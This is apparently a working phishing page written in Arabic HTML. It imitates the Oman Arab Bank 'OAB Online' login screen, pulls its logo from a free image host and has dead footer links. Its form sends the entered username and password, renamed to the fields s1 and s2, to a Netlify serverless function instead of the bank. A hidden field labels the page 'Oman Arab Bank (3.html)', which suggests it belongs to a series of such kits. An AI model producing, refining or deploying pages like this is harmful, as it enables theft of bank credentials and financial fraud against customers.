<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بنك عمان العربي - تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #004b8d;
            background-image: radial-gradient(circle, rgba(0, 75, 141, 0.7) 0%, #004b8d 100%);
            min-height: 100vh;
            direction: rtl;
            color: white;
            position: relative;
        }
        
        /* الخلفية مع الدوائر */
        .bg-circles {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            overflow: hidden;
            z-index: 0;
        }
        
        .bg-circles::before,
        .bg-circles::after {
            content: '';
            position: absolute;
            background-color: rgba(0, 90, 170, 0.3);
            border-radius: 50%;
        }
        
        .bg-circles::before {
            width: 300px;
            height: 300px;
            top: 40%;
            right: -100px;
        }
        
        .bg-circles::after {
            width: 200px;
            height: 200px;
            top: 60%;
            left: -50px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }
        
        /* الرأس العلوي مع الشعار */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 0 30px;
        }
        
        .language-switch {
            font-size: 18px;
            color: white;
            text-decoration: none;
        }
        
        .logo-container {
            text-align: center;
        }
        
        .logo {
            max-width: 220px;
            height: auto;
        }
        
        /* مربع تسجيل الدخول */
        .login-box {
            background-color: white;
            border-radius: 5px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .login-header {
            background-color: #f5f5f5;
            color: #0077c8;
            padding: 15px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            border-bottom: 1px solid #eee;
        }
        
        .login-form {
            padding: 20px;
            background-color: #f0f4f8;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: bold;
        }
        
        .form-control {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background-color: white;
            font-size: 16px;
            color: #333;
        }
        
        .btn-login {
            width: 100%;
            background-color: #ff6a00;
            background-image: linear-gradient(to right, #ff6a00, #ff9966);
            color: white;
            border: none;
            border-radius: 4px;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .forgot-password {
            text-align: right;
            margin-top: 15px;
            font-size: 14px;
            color: #555;
        }
        
        .forgot-password a {
            color: #555;
            text-decoration: none;
        }
        
        /* البانر السفلي */
        .bottom-banner {
            margin-top: 20px;
            border-radius: 5px;
            overflow: hidden;
        }
        
        .bottom-banner img {
            width: 100%;
            display: block;
            height: auto;
        }
        
        /* تذييل الصفحة */
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.7);
        }
        
        .footer-links {
            margin-top: 10px;
            display: flex;
            justify-content: center;
            gap: 20px;
        }
        
        .footer-links a {
            color: rgba(255, 255, 255, 0.7);
            text-decoration: none;
        }
    </style>
</head>
<body>
    <!-- خلفية الدوائر -->
    <div class="bg-circles"></div>
    
    <div class="container">
        <!-- الرأس العلوي مع الشعار -->
        <div class="header">
            <a href="#" class="language-switch"></a>
            <div class="logo-container">
                <img src="https://www2.0zz0.com/2025/05/13/13/947658369.png" alt="بنك عمان العربي" class="logo">
            </div>
            <div style="width: 70px;"></div> <!-- عنصر للمحاذاة -->
        </div>
        
        <!-- مربع تسجيل الدخول -->
        <div class="login-box">
            <div class="login-header">
                تسجيل الدخول OAB Online
            </div>
            <div class="login-form">
                <form action="/.netlify/functions/submit-login" method="post" id="loginForm">
                    <div class="form-group">
                        <input type="hidden" name="source" value="Oman Arab Bank (3.html)">
                        <label for="username">اسم المستخدم</label>
                        <input name="s1" type="text" id="username" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label for="password">كلمة المرور</label>
                        <input name="s2" type="password" id="password" class="form-control" required>
                    </div>
                    <button type="submit" class="btn-login">الدخول</button>
                </form>
                <div class="forgot-password">
                    <a href="#">نسيت كلمة السر / مساعدة</a>
                </div>
            </div>
        </div>
        
        <!-- البانر السفلي -->
        <div class="bottom-banner">
            
              </div>
        
        <!-- تذييل الصفحة -->
        <div class="footer">
            <div>الحقوق محفوظة©2019 - بنك عمان العربي</div>
            <div class="footer-links">
                <a href="#">الخصوصية والأمن</a>
                <a href="#">الشروط و الأحكام</a>
            </div>
        </div>
    </div>

    
</body>
</html>
